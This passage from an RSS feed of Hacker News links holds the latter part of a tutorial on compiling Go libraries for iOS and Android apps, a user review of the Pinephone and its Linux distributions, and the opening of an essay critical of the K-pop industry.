<span>elif</span> <span>[</span> <span>"</span><span>$GOARCH</span><span>"</span> <span>=</span><span>=</span> <span>"arm64"</span> <span>]</span>; <span>then</span>
    <span>CARCH</span><span>=</span><span>"arm64"</span>
<span>fi</span>

<span>exec</span> <span>$CLANG</span> -arch <span>$CARCH</span> -isysroot <span>$SDK_PATH</span> -mios-version-min<span>=</span>10.0 <span>"</span><span>$@</span><span>"</span>
</code></pre></div><p>Don't forget to make it executable:</p>
<pre><code>chmod +x clangwrap.sh
</code></pre><p>Now we can build our library for each architecture and combine into a fat binary using the <code>lipo</code> tool (via a Makefile):</p>
<div><pre><code data-lang="make"><span># go/Makefile
</span><span></span>
<span>ios-arm64</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>darwin <span>\
</span><span></span>	<span>GOARCH</span><span>=</span>arm64 <span>\
</span><span></span>	<span>SDK</span><span>=</span>iphoneos <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>PWD<span>)</span>/clangwrap.sh <span>\
</span><span></span>	<span>CGO_CFLAGS</span><span>=</span><span>"-fembed-bitcode"</span> <span>\
</span><span></span>	go build -buildmode<span>=</span>c-archive -tags ios -o <span>$(</span>IOS_OUT<span>)</span>/arm64.a ./cmd/libfoo

<span>ios-x86_64</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>darwin <span>\
</span><span></span>	<span>GOARCH</span><span>=</span>amd64 <span>\
</span><span></span>	<span>SDK</span><span>=</span>iphonesimulator <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>PWD<span>)</span>/clangwrap.sh <span>\
</span><span></span>	go build -buildmode<span>=</span>c-archive -tags ios -o <span>$(</span>IOS_OUT<span>)</span>/x86_64.a ./cmd/libfoo

<span>ios</span><span>:</span> ios-arm64 ios-x86_64
	lipo <span>$(</span>IOS_OUT<span>)</span>/x86_64.a <span>$(</span>IOS_OUT<span>)</span>/arm64.a -create -output <span>$(</span>IOS_OUT<span>)</span>/foo.a
	cp <span>$(</span>IOS_OUT<span>)</span>/arm64.h <span>$(</span>IOS_OUT<span>)</span>/foo.h
</code></pre></div><h2 id="create-our-ios-application">Create our iOS Application</h2>
<p>Using XCode we can create a simple single page application. I'm going to use Swift UI, but it is just as easy to do with
UIKit:</p>
<div><pre><code data-lang="swift"><span>//</span><span> </span><span>i</span><span>o</span><span>s</span><span>/</span><span>f</span><span>o</span><span>o</span><span>b</span><span>a</span><span>r</span><span>/</span><span>C</span><span>o</span><span>n</span><span>t</span><span>e</span><span>n</span><span>t</span><span>V</span><span>i</span><span>e</span><span>w</span><span>.</span><span>s</span><span>w</span><span>i</span><span>f</span><span>t</span>

<span>struct</span> <span>ContentView</span>: View {

    @State <span>private</span> <span>var</span> <span>txt</span>: <span>String</span> = <span>"</span><span>"</span>

    <span>var</span> <span>body</span>: some View {
        VStack{
            TextField(<span>"</span><span>"</span>, text: <span>$</span>txt)
            .textFieldStyle(RoundedBorderTextFieldStyle())
            Button(<span>"</span><span>Reverse</span><span>"</span>){
                <span>//</span><span> </span><span>R</span><span>e</span><span>v</span><span>e</span><span>r</span><span>s</span><span>e</span><span> </span><span>t</span><span>e</span><span>x</span><span>t</span><span> </span><span>h</span><span>e</span><span>r</span><span>e</span>
            }
            Spacer()
        }
        .padding(.all, <span>15</span>)
    }
}
</code></pre></div><p>In XCode we can drag-and-drop our newly generated <code>foo.a</code> and <code>foo.h</code> into our project. For our Swift code to
interop with our library we need to create a bridging header:</p>
<div><pre><code data-lang="c"><span>// ios/foobar/foobar-Bridging-Header.h
</span><span></span>
<span>#</span><span>import "foo.h"</span><span>
</span></code></pre></div><p>In Xcode <code>Build Settings</code>, under <code>Swift Compiler - General</code> set the <code>Objective-C Bridging Header</code> to the file we just
created: <code>foobar/foobar-Bridging-Header.h</code>.</p>
<p>We also need to set the <code>Library Search Paths</code> to include the directory of our generated header file <code>foo.h</code>.
(Xcode may have done this for you when you drag-and-drop the files into the project).</p>
<p>We can now call our function from Swift, then build and run:</p>
<div><pre><code data-lang="swift"><span>//</span><span> </span><span>i</span><span>o</span><span>s</span><span>/</span><span>f</span><span>o</span><span>o</span><span>b</span><span>a</span><span>r</span><span>/</span><span>C</span><span>o</span><span>n</span><span>t</span><span>e</span><span>n</span><span>t</span><span>V</span><span>i</span><span>e</span><span>w</span><span>.</span><span>s</span><span>w</span><span>i</span><span>f</span><span>t</span>

Button(<span>"</span><span>Reverse</span><span>"</span>){
    <span>let</span> <span>str</span> = reverse(<span>UnsafeMutablePointer</span>&lt;<span>Int8</span>&gt;(<span>mutating</span>: (<span>self</span>.txt <span>as</span> NSString).utf8String))
    <span>self</span>.txt = <span>String</span>.<span>init</span>(cString: str!, encoding: .utf8)<span>!</span>
    <span>//</span><span> </span><span>d</span><span>o</span><span>n</span><span>'</span><span>t</span><span> </span><span>f</span><span>o</span><span>r</span><span>g</span><span>e</span><span>t</span><span> </span><span>t</span><span>o</span><span> </span><span>r</span><span>e</span><span>l</span><span>e</span><span>a</span><span>s</span><span>e</span><span> </span><span>t</span><span>h</span><span>e</span><span> </span><span>m</span><span>e</span><span>m</span><span>o</span><span>r</span><span>y</span><span> </span><span>t</span><span>o</span><span> </span><span>t</span><span>h</span><span>e</span><span> </span><span>C</span><span> </span><span>S</span><span>t</span><span>r</span><span>i</span><span>n</span><span>g</span>
    str?.deallocate()
}
</code></pre></div><p><img src="https://rogchap.com/posts/img/libfoo_ios.gif" alt="libfoo ios app"></p>

<p>Using Android Studio, we will create a new Android project. From the Project Templates select <code>Native C++</code>, which will
create a project with an Empty Activity that is configured to use the Java Native Interface (JNI). We will still select
<code>Kotlin</code> as our language of choice for the project.</p>
<p>After creating a simple Activity with a <code>EditText</code> and a <code>Button</code> we create the basic functionality for our app:</p>
<div><pre><code data-lang="kotlin"><span>// android/app/src/main/java/com/rogchap/foobar/MainActivity.kt
</span><span></span>
<span>class</span> <span>MainActivity</span> : AppCompatActivity() {

    <span>override</span> <span>fun</span> <span>onCreate</span>(savedInstanceState: Bundle?) {
        <span>super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btn.setOnClickListener {
            txt.setText(reverse(txt.text.toString()))
        }
    }

    <span>/**
</span><span>     * A native method that is implemented by the 'native-lib' native library,
</span><span>     * which is packaged with this application.
</span><span>     */</span>
    <span>private</span> <span>external</span> <span>fun</span> <span>reverse</span>(str: String): String

    <span>companion</span> <span>object</span> {
        <span>// Used to load the 'native-lib' library on application startup.
</span><span></span>        init {
            System.loadLibrary(<span>"native-lib"</span>)
        }
    }
}
</code></pre></div><p>We created (and called) an external function <code>reverse</code> that we need to implement in the JNI (C++):</p>
<div><pre><code data-lang="cpp"><span>// android/app/src/main/cpp/native-lib.cpp
</span><span></span>
<span>extern</span> <span></span><span>"</span><span>C</span><span>"</span> {
    jstring
    <span>Java_com_rogchap_foobar_MainActivity_reverse</span>(JNIEnv<span>*</span> env, jobject, jstring str) {
        <span>// Reverse text here 
</span><span></span>        <span>return</span> str;
    }
}
</code></pre></div><p>The JNI code has to follow the conventions to interop correctly between the Native C++ and Kotlin (JVM).</p>
<h2 id="build-for-android">Build for Android</h2>
<p>The way the JNI works with external libraries has changed over the many releases of Android and the NDK. The current
(and easiest) is to place our outputted library into a special <code>jniLibs</code> folder that is copied into our final APK file.</p>
<p>Rather than creating a Fat binary (as we did for iOS) we are going to place each architecture in the correct folder.
Again, for the JNI, conventions matter.</p>
<div><pre><code data-lang="make"><span>/</span><span>/</span> <span>g</span><span>o</span><span>/</span><span>M</span><span>a</span><span>k</span><span>e</span><span>f</span><span>i</span><span>l</span><span>e</span>

<span>ANDROID_OUT</span><span>=</span>../android/app/src/main/jniLibs
<span>ANDROID_SDK</span><span>=</span><span>$(</span>HOME<span>)</span>/Library/Android/sdk
<span>NDK_BIN</span><span>=</span><span>$(</span>ANDROID_SDK<span>)</span>/ndk/21.0.6113669/toolchains/llvm/prebuilt/darwin-x86_64/bin

<span>android-armv7a</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>android <span>\
</span><span></span>	<span>GOARCH</span><span>=</span>arm <span>\
</span><span></span>	<span>GOARM</span><span>=</span><span>7</span> <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>NDK_BIN<span>)</span>/armv7a-linux-androideabi21-clang <span>\
</span><span></span>	go build -buildmode<span>=</span>c-shared -o <span>$(</span>ANDROID_OUT<span>)</span>/armeabi-v7a/libfoo.so ./cmd/libfoo

<span>android-arm64</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>android <span>\
</span><span></span>	<span>GOARCH</span><span>=</span>arm64 <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>NDK_BIN<span>)</span>/aarch64-linux-android21-clang <span>\
</span><span></span>	go build -buildmode<span>=</span>c-shared -o <span>$(</span>ANDROID_OUT<span>)</span>/arm64-v8a/libfoo.so ./cmd/libfoo

<span>android-x86</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>android <span>\
</span><span></span>	<span>GOARCH</span><span>=</span><span>386</span> <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>NDK_BIN<span>)</span>/i686-linux-android21-clang <span>\
</span><span></span>	go build -buildmode<span>=</span>c-shared -o <span>$(</span>ANDROID_OUT<span>)</span>/x86/libfoo.so ./cmd/libfoo

<span>android-x86_64</span><span>:</span>
	<span>CGO_ENABLED</span><span>=</span><span>1</span> <span>\
</span><span></span>	<span>GOOS</span><span>=</span>android <span>\
</span><span></span>	<span>GOARCH</span><span>=</span>amd64 <span>\
</span><span></span>	<span>CC</span><span>=</span><span>$(</span>NDK_BIN<span>)</span>/x86_64-linux-android21-clang <span>\
</span><span></span>	go build -buildmode<span>=</span>c-shared -o <span>$(</span>ANDROID_OUT<span>)</span>/x86_64/libfoo.so ./cmd/libfoo

<span>android</span><span>:</span> android-armv7a android-arm64 android-x86 android-x86_64
</code></pre></div><p><strong>Note</strong> Make sure you set the correct location for your Android SDK and the version of the NDK you have downloaded.</p>
<p>Running <code>make android</code> will now build all the shared libraries we need into the correct folder. We now need to add our
library to CMake:</p>
<div><pre><code data-lang="cmake"><span>/</span><span>/</span> <span>a</span><span>n</span><span>d</span><span>r</span><span>o</span><span>i</span><span>d</span><span>/</span><span>a</span><span>p</span><span>p</span><span>/</span><span>s</span><span>r</span><span>c</span><span>/</span><span>m</span><span>a</span><span>i</span><span>n</span><span>/</span><span>c</span><span>p</span><span>p</span><span>/</span><span>C</span><span>M</span><span>a</span><span>k</span><span>e</span><span>L</span><span>i</span><span>s</span><span>t</span><span>s</span><span>.</span><span>t</span><span>x</span><span>t</span><span>
</span><span></span><span>
</span><span></span><span>/</span><span>/</span> <span>.</span><span>.</span><span>.</span><span>
</span><span></span><span>
</span><span></span><span>add_library</span>(<span>lib_foo</span> <span>SHARED</span> <span>IMPORTED</span>)<span>
</span><span></span><span>set_property</span>(<span>TARGET</span> <span>lib_foo</span> <span>PROPERTY</span> <span>IMPORTED_NO_SONAME</span> <span>1</span>)<span>
</span><span></span><span>set_target_properties</span>(<span>lib_foo</span> <span>PROPERTIES</span> <span>IMPORTED_LOCATION</span> <span>${</span><span>CMAKE_CURRENT_SOURCE_DIR</span><span>}</span><span>/../jniLibs/</span><span>${</span><span>CMAKE_ANDROID_ARCH_ABI</span><span>}</span><span>/libfoo.so</span>)<span>
</span><span></span><span>include_directories</span>(<span>${</span><span>CMAKE_CURRENT_SOURCE_DIR</span><span>}</span><span>/../jniLibs/</span><span>${</span><span>CMAKE_ANDROID_ARCH_ABI</span><span>}</span><span>/</span>)<span>
</span><span></span><span>
</span><span></span><span>/</span><span>/</span> <span>.</span><span>.</span><span>.</span><span>
</span><span></span><span>
</span><span></span><span>target_link_libraries</span>(<span>native-lib</span> <span>lib_foo</span> <span>${</span><span>log-lib</span><span>}</span>)<span>
</span></code></pre></div><p>It took me a while to figure out these settings, once again, naming matters so was important to name the library with
<code>lib_xxxx</code> and also set the property <code>IMPORTED_NO_SONAME 1</code> otherwise your apk will be looking for your library in the
wrong place.</p>
<p>We can now hookup our JNI code to our Go library, cross our fingers, and run our app:</p>
<div><pre><code data-lang="cpp"><span>// android/app/src/main/cpp/native-lib.cpp
</span><span></span>
<span>#</span><span>include</span> <span>"libfoo.h"</span><span>
</span><span></span>
<span>extern</span> <span></span><span>"</span><span>C</span><span>"</span> {
    jstring
    <span>Java_com_rogchap_foobar_MainActivity_reverse</span>(JNIEnv<span>*</span> env, jobject, jstring str) {
        <span>const</span> <span>char</span><span>*</span> cstr <span>=</span> env<span>-</span><span>&gt;</span>GetStringUTFChars(str, <span>0</span>);
        <span>char</span><span>*</span> cout <span>=</span> reverse(<span>const_cast</span><span>&lt;</span><span>char</span><span>*</span><span>&gt;</span>(cstr));
        jstring out <span>=</span> env<span>-</span><span>&gt;</span>NewStringUTF(cout);
        env<span>-</span><span>&gt;</span>ReleaseStringUTFChars(str, cstr);
        free(cout);
        <span>return</span> out;
    }
}
</code></pre></div><p><img src="https://rogchap.com/posts/img/libfoo_android.gif" alt="libfoo android app"></p>
<h2 id="conclusion">Conclusion</h2>
<p>One of Go's strengths is that it's cross-platform; but that doesn't just mean Window, Mac and Linux, Go can target many
other architectures including iOS and Android. Now you have another option in your toolbelt to create shared …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rogchap.com/2020/09/14/running-go-code-on-ios-and-android/">https://rogchap.com/2020/09/14/running-go-code-on-ios-and-android/</a></em></p>]]>
            </description>
            <link>https://rogchap.com/2020/09/14/running-go-code-on-ios-and-android/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525336</guid>
            <pubDate>Sat, 19 Sep 2020 05:19:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Review of Pinephone PostmarketOS CE]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24525210">thread link</a>) | @vidak
<br/>
September 18, 2020 | https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini | <a href="https://web.archive.org/web/*/https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div><p>The version of the Pinephone that I am reviewing is the postmarketOS</p><p>Community Edition (CE).</p><p>My first impression of the Pinephone after I unboxed the device was</p><p>very good. I enjoyed the feeling of the weight of the Pinephone in my</p><p>hand, and the overall build quality of the system still impresses</p><p>me. It is my opinion that the PINE64 hardware development and</p><p>manufacturing process is very solid. For what I paid, which was about</p><p>AUD$200 all up, I believe I have received hardware that is superior</p><p>than a phone that I could have bought from a retail store in my city</p><p>for the same price.</p><p>The screen is glossy, and the capacitive touch screen (this is a</p><p>question fellow smolnet citizen Shufei wanted answered in some detail)</p><p>responds well.</p><p>I was, however, disappointed with the stock postmarketOS software that</p><p>came flashed on the eMMC. The Software Centre was a particular</p><p>disappointment. It, by default, only showed the currently installed</p><p>software, and it was not possible to browse any other software which</p><p>was not already installed.</p><p>Also, the camera application that came installed by default, 'Cheese',</p><p>did not allow the camera to function.</p><p>I attempted to install Plasma Mobile using the command line, following</p><p>these instructions:</p><p>But it ended up completely wrecking the function of the</p><p>phone. Installing the package that the wiki article recommended did</p><p>not update LightDM, and I ended up soft-bricking the phone while</p><p>fiddling with the LightDM configuration in order to stop the phone</p><p>from (still) booting into phosh, and not Plasma Mobile.</p><p>It also disabled cell data functionality, and ended up messing with a</p><p>lot of the guts of the Linux installation. So I do not recommend</p><p>attempting to switch to Plasma Mobile on the Pinephone from inside an</p><p>already-existing postmarketOS installation. I recommend getting a</p><p>Plasma Mobile system image, and flashing that from the start if you</p><p>wish to experiment with different user interfaces.</p><div><p><span> ##</span></p><h2>Linux Software Distributions</h2></div><p>There is a great many Linux distributions available for the</p><p>Pinephone. The following link to the PINE64 wiki contains a</p><p>more-or-less exhaustive list of each of them:</p><p>The Linux distributions that I tested out are:</p><div><p><span>###</span></p><h3>postmarketOS (phosh UI)</h3></div><p>I enjoyed this system image because it came with a wizard for</p><p>NetworkManager which enabled me to make sure cell data worked most</p><p>consistently. However, the power consumption of this image was</p><p>prohibitively high, and it caused the phone to run very hot. When the</p><p>battery was at 10% charge, rebooting the phone would cause the last of</p><p>this precious charge to be used up, and the phone would run completely</p><p>out of power.</p><p>This image was basically a desktop UI, and did not have many, if any</p><p>mobile UI configurations present. It was rather fun to see the</p><p>Pinephone boot into a full GNOME desktop environment. I imagine if you</p><p>had a bigger screen connected to the Pinephone, you would be quite</p><p>impressed with what this phone could pull off.</p><div><p><span>###</span></p><h3>postmarketOS (Plasma Mobile)</h3></div><p>Slow and buggy, really.</p><p>This distribution has a major problem at the moment: the unlock/power</p><p>button is not properly debounced, and it makes it virtually impossible</p><p>sometimes to unlock the phone. Otherwise, this distribution is very,</p><p>very impressive, and I would actually like to switch to it, because</p><p>cell data works best for Optus on Ubuntu Touch.</p><p>This distribution could indeed be a daily driver for someone if they</p><p>could sort out the button debouncing problem.</p><p>This is a Linux-based operating system that uses a closed-source</p><p>UI. It was so glossy and locked-down in terms of configurability that</p><p>I was turned off using it. It has a great tutorial for teaching you</p><p>the gestures you need to learn in order to use the touch screen.</p><p>I did like the fact that it organised all your contacts and messages</p><p>into interesting metaphors, and it ran reasonably quickly, but there</p><p>is no way of configuring the UI beyond what how it arrives to you.</p><p>This image was fairly slow to run on the Pinephone, but in my opinion</p><p>it is the absolute best demonstration of KDE Plasma Mobile. It was</p><p>very visually impressive, and the menus were full-featured and</p><p>informative. It did not, however, support phone calls or SMS.</p><p>This is my current choice of Linux distribution for the phone. It has</p><p>a software centre full of different and interesting programs,</p><p>including Transmission (torrent client) and GIMP (!!! I have yet to</p><p>install this to see how or if it works well, but the fact that it is</p><p>possible to at least _run_ GIMP in some capacity on the Pinephone</p><p>would like like running Adobe Photoshop on a Samsung Galaxy).</p><p>This is merely anecdotal, and I have not performed any scientific</p><p>tests to work out if this is true, but the latest September 2020</p><p>stable release of this image seems to have the best power settings of</p><p>any of the other distributions for this phone.</p><p>I hesitate to give an estimate of exactly how long this phone will</p><p>last on a single charge, given normal use. But, I finished charging</p><p>this phone at 0700HRS this morning, and, with no other charge, it is now</p><p>on 50% charge, and the current time is 1230HRS. I think I have put the</p><p>phone through a little heavier use than I do normally, this morning,</p><p>however.</p><p>Virtually all of the functions of the phone are enabled without any</p><p>configuration in Mobian.</p><p>I highly recommend flashing the following system image to an SD card</p><p>so you can try out all the major Linux distributions for your phone:</p><p>It contains 13 different distributions, and it is trivial to switch</p><p>between each of them through the main boot menu.</p><p>I have rung a few people on the phone, and, assuming you have a</p><p>distribution flashed on the phone that supports phonecalls (like the</p><p>one I am currently using, Mobian), there should be absolutely no issue</p><p>using this fundamental feature of the Pinephone.</p><p>For the most part, the cell data modem in the Pinephone works well for</p><p>me. There is a fairly large problem with my use of the Pinephone with</p><p>its cell data, however.</p><p>I live in Australia, and the mobile phone carrier that I use is</p><p>Optus. The setup(s) that work for me with my Pinephone, running</p><p>Mobian, is:</p><p>&gt; Name: 1</p><p>&gt; APN: yesinternet</p><p>&gt; Name: Optus Yes Internet</p><p>&gt; APN: yesinternet</p><p>After about 3 or 4 hours after I boot up the phone, the cell data</p><p>stops working, and the Network Mode in the 'Mobile' submenu of</p><p>Settings changes from</p><p>&gt; 2G, 3G, 4G (Preferred)</p><p>to just</p><p>&gt; 2G, 3G, 4G</p><p>This issue is fixed for another 3 or 4 hours by rebooting the phone,</p><p>which does not actually take that long (about 10 to 15 seconds), but</p><p>it is a hassle to be cut off from mobile data if you forget about your</p><p>phone.</p><p>These two links help shed light on exactly what is happening with the</p><p>Pinephone when it tries to remain connected to the Optus network:</p><p>(A forum post. Someone using a similar, if not identical mobile data</p><p>modem as the Pinephone in Australia, with the Optus network)</p><p>(A Github post which familiarises the reader with the concepts and</p><p>command line tools involved in using Linux with 4G LTE modems on</p><p>Debian and Ubuntu)</p><p>The issue with the Pinephone is explained the forum thread (the first</p><p>link). The issue is that there are at least two modes for the Quectel</p><p>EG25 modem that the Pinephone uses, only one of which seems to be</p><p>supported by Optus. The two modes are QMI and MBIM. Optus, I assume,</p><p>only supoprts MBIM:</p><p>https://forum.gl-inet.com/t/using-rooter-on-the-gl-x750/8983/8 Forum post</p><p>The relevant sentence from the above forum post is:</p><p>&gt; Also, MBIM is buggy for Quectel modems even in OpenWRT 19.07</p><p>&gt; (snapshot), mostly sometimes modem “freezes” and I need to restart.</p><p>The issue that the original poster was having with this modem is</p><p>explained in the same post:</p><p>&gt; The reason is exactly this: user.notice Create Connection:</p><p>&gt; WDA-GET-DATA-FORMAT is “raw-ip” </p><p>&gt; When you use a modem over QMI and the data-format is “raw-ip” the</p><p>&gt; system needs to know that modem is on “raw-ip”, without that,</p><p>&gt; interface doesn’t get an IP address.</p><p>When I was using the postmarketOS version of phosh, the NetworkManager</p><p>program started a wizard which contained a lot more options about how</p><p>to configure the Pinephone's Quectel LTE modem. One activity I would</p><p>like to carry out is learning how to start this wizard from within</p><p>Mobian. I wish to keep Mobian as the primary operating system for the</p><p>Pinephone just because its Software Centre has such an amazing</p><p>quantity and quality of different programs, and the postmarketOS</p><p>Centre requires you to manually search for the programs you want, in</p><p>order for them to show up at all inside the Centre.</p><p>The GPS seems to function perfectly fine inside the default Mobian</p><p>maps program. It can show you, with reasonable accuracy (although not</p><p>to the same accuracy as, say, a proprietary maps application) exactly</p><p>where you are. I think the accuracy of the GPS on the Pinephone is</p><p>somewhere in the region of 10 square metres.</p><p>The main issue with the GPS, however, is that it does not currently</p><p>link in with the Perth public transport system. I cannot use this</p><p>program to plan public transport journeys. But I believe I should be</p><p>able to take care of this problem by either (a) adding data to</p><p>OpenStreetMap, or (b) using a web browser, where I should be able to</p><p>access the Transperth public transport trip planner webpage.</p><p>This is a feature that works without a hitch in Mobian. I was</p><p>surprised to see myself receiving SMS messages unexpectedly from</p><p>friends as I left the phone in my pocket and forgot about it.</p><p>The camera application in Mobian works. However it has a refresh rate</p><p>of around 1 FPS. The quality is passable. This is not an issue for me</p><p>because, philosophically, phone cameras should not replace the</p><p>function of proper dedicated photographic devices. Will this camera</p><p>take reasonable photos? Yes. What is the comparison of the quality of</p><p>the photos? I would venture a guess that it is about as good as a</p><p>cheap action camera, like a GoPro knock-off.</p><div><p><span> ##</span></p><h2>Flashing Different Operating Systems</h2></div><p>Compared to the arduous process that one has to go through in order to</p><p>change operating systems on an Android phone, the Pinephone is very</p><p>easy to flash. You can flash data onto both an SD card, or the phone's</p><p>internal eMMC.</p><p>For flashing an SD card, the process is as …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini">https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</a></em></p>]]>
            </description>
            <link>https://proxy.vulpes.one/gemini/tanelorn.city/~vidak/pinephone/pinephone-review.gemini</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525210</guid>
            <pubDate>Sat, 19 Sep 2020 04:56:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Deep Dive into K-pop]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525108">thread link</a>) | @eswat
<br/>
September 18, 2020 | https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-719">

	
	<!-- .entry-header -->


			<div>

			<p><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8dedad4c-ee57-46fd-91a2-32cbb9a652d1/d97l7vh-b56d2b05-419a-4aa2-90c9-1f7a87db1968.jpg/v1/fill/w_1024,h_725,q_75,strp/my_first_kpop_collage_by_rainbowcandleofjoy_d97l7vh-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzI1IiwicGF0aCI6IlwvZlwvOGRlZGFkNGMtZWU1Ny00NmZkLTkxYTItMzJjYmI5YTY1MmQxXC9kOTdsN3ZoLWI1NmQyYjA1LTQxOWEtNGFhMi05MGM5LTFmN2E4N2RiMTk2OC5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.Py2kzajyzSvCd5CFWXNFSOW5m_rgR6UJMXllQj3dy18" alt="KPOP Collections: Kpop Groups Collage"></p>
<p>Prior to last month, I knew next to nothing about K-pop (Korean popular music) besides having heard a few songs in passing and the rumors of the industry’s infamous elements, most notably a string of high profile suicides over the last few years. As an American with no connection to music or South Korean culture, I wondered if I was getting an accurate picture of the industry or if I was being misled by the most lurid and morbid elements eagerly conveyed by the media.</p>
<p>So I decided to do a deep dive down the internet rabbit hole of K-pop to understand what it is, how it works, and what I think about it. For anything that’s not my personal opinion or that goes beyond basic historical knowledge, I’ll cite my sources, which are a mixture of news articles, academic articles, YouTube videos, and some content aggregators like Wikipedia and Statista. I welcome any corrections or criticisms on inaccurate sources or things I didn’t understand.</p>
<p>I’ll warn you upfront – this essay is over 30,000 words long. It is the largest post I have made on dormin.org besides my novel. Since I sympathize with anyone who doesn’t want to make such a large time investment into a subject of passing curiosity, I will present my key findings here divided between the five <strong>parts</strong> of the essay. If you’re not sure if you want to read everything, you can jump to any individual part and understand it without reading the other sections.</p>

<h3><a href="#Basics"><strong><u>Part 1</u> – <u>The Basics</u></strong></a></h3>
<ul>
<li>“K-pop” is both a genre of music and an entire industry which “manufacturers” performers and their performance output (music, dance routines, shows, merchandise, etc.) in a highly systematized top-down manner</li>
<li>The global popularity of K-pop is extraordinary considering the relatively small population of South Korea, and the relatively small size of K-pop production companies</li>
</ul>
<h3><a href="#Product"><strong><u>Part 2</u> – <u>The Product</u></strong></a></h3>
<ul>
<li>K-pop’s industrial/corporate structure represents a Korean (and East-Asian) cultural alternative to Western pop and broader music production</li>
<li>K-pop stars and bands are manufactured and controlled by production companies in the same manner Western athletes are trained and traded by sports teams.</li>
<li>K-pop stars are crafted into idealized portrays of individuals by East Asian cultural standards</li>
</ul>
<h3><a href="#Fans"><strong><u>Part 3</u> – <u>The Fans</u></strong></a></h3>
<ul>
<li>K-pop fandom is both more intense on average than Western fandom, and has a larger percentage of unhealthily obsessive fans</li>
<li>K-pop fandom is based on a parasocial relationship between fans and stars</li>
<li>K-pop stars are forced to abide by extremely restrictive behavioral norms to appease production companies and fans</li>
</ul>
<h3><a href="#Process"><strong><u>Part 4</u>– <u>The Process</u></strong></a></h3>
<ul>
<li>Trying to become a K-pop star is a terrible idea by any rational cost-benefit analysis</li>
<li>The process by which production companies train K-pop stars is abusive and depends on the ignorance of children/teenagers and clueless and/or malicious parents</li>
<li>Even after making it through the extraordinarily difficult audition and training process, the vast majority of K-pop stars will have short careers and earn little or possibly <em>no</em> money</li>
</ul>
<h3><a href="#Machine"><strong><u>Part 5</u> – <u>The Machine</u></strong></a></h3>
<ul>
<li>K-pop is an extremely centralized, hierarchical industry, where structural, business, and creative decisions are almost entirely made by corporate management, rather than the performers</li>
<li>Raw creativity in the music production process is largely outsourced to Westerners who write, produce, and choreograph the music</li>
<li>The K-pop industry is subsidized and supported by the South Korean government, if not implicitly or explicitly directed, as a conscious form of soft power projection and social control.</li>
</ul>
<p>As you can tell, I came away from my research with a negative view of K-pop. I don’t think it’s the worst thing in the world, but I find its fandom to be unhealthy and its production process to be exploitative. That being said, there are undoubtedly many tremendous talents in the K-pop world and the cultural power of K-pop is remarkable. I’ll give my summarized thoughts on K-pop as a whole at the conclusion of the essay.<br>
<a name="Basics"></a></p>
<hr>
<p><img src="https://www.rollingstone.com/wp-content/uploads/2018/08/BTS-kpop-takeover-the-world.jpg" alt="How K-Pop Conquered the West - Rolling Stone"></p>
<h2><strong><u>Part 1</u> – <u>The Basics</u></strong></h2>
<h3><strong>What is K-pop?</strong></h3>
<p>“K-pop” refers to a genre of music and the industry which creates it. Both are based out of South Korea and particularly Seoul.</p>
<h3><strong>What is K-pop music?</strong></h3>
<p>K-pop is an offshoot of 90s Western pop with heavy influences from synthetics and hip hop. Lyrics are mostly Korean, but with English words and sometimes other languages thrown in. K-pop is usually sung by mono-gendered bands with members aged from their mid-teens to late 20s. Such bands typically resemble the structure and appearance of American boy bands from the 90s and 2000s (ie. NSYNC). As a representative K-pop sample, check out “DNA” by BTS:</p>
<p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/MBdVXkSdhwU?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
